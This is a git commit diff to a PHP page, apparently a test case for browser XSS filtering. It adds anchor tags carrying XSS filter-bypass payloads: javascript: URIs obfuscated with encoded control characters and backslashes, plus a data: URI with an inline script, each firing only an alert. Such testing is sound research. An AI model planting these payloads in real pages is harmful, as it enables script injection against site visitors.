9609bacc2ba982d658f5e0298e79a7008dd40aea
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-29 18:56:46 +0100

    Update xssprot.php

--- xssprot.php
+++ xssprot.php
@@ -4,11 +4,23 @@ header('X-XSS-Protection: 1')
 
 <html>
 <head>
-<base href="/xxx/">
 
 <head>
 <body>
 <a href="java%0ascript:alert(1)">xss</a>
+  <a href="">xss</a>
+   <a href="java%09script:alert(1)">xss</a>
+   <a href="java%0dscript:alert(1)">xss</a>
+   <a href="\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)">xss</a>
+   <a href="java%41script:alert(1)">xss</a>
+   <a href="data%3Atext/html,<script>alert(0)</script>">xss</a>
+   <a href="">xss</a>
+   <a href="">xss</a>
+   <a href="">xss</a>
+   <a href="">xss</a>
+   <a href="">xss</a>
+   <a href="">xss</a>
+  
 
 <body>
 </html>
